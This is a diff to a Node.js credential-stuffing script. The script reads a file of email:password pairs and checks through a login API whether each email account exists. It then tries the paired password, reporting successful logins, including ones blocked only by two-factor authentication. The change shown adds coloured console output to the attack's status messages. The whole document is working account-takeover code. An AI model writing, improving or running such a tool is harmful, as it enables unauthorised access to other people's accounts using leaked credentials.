@@ -12,6 +12,11 @@ threads_limit = 10
 
 var user_pass_file = process.argv[2]
 
+FgRed = "\x1b[31m"
+FgGreen = "\x1b[32m"
+FgBlue = "\x1b[34m"
+FgCyan = "\x1b[36m"
+
 function is_email_valid(cred){
   email = cred.split(':')[0]
   let bodyString = `{"Username":"${email}"}`
@@ -33,10 +38,10 @@ function is_email_valid(cred){
   request(options, function (error, response, body) {
     let email_status = JSON.parse(body).IfExistsResult
     if(email_status == 0){
-      console.log(`[+] VALID_EMAIL: ${email}`)
+      console.log(FgBlue, `[*] VALID_EMAIL: ${email}`)
       is_password_valid(cred)
     }else{
-      console.log(`[-] UNKNOWN_EMAIL: ${email}`)
+      console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email}`)
       threads -= 1
       thread_api()
     }
@@ -62,11 +67,11 @@ function is_password_valid(cred){
   }
   request(options, function (error, response, body) {
     if(response.statusCode == 403){
-      console.log(`[+] SUCCESS (But 2FA): ${cred}`)
+      console.log(FgGreen, `[+] SUCCESS (But 2FA): ${cred}`)
     }else if(response.statusCode == 200){
-      console.log(`[+] SUCCESS: ${cred}`)
+      console.log(FgGreen, `[+] SUCCESS: ${cred}`)
     }else{
-      console.log(`[-] fail: ${cred}`)
+      console.log(FgRed, `[-] fail: ${cred}`)
     }
     threads -= 1
     thread_api()
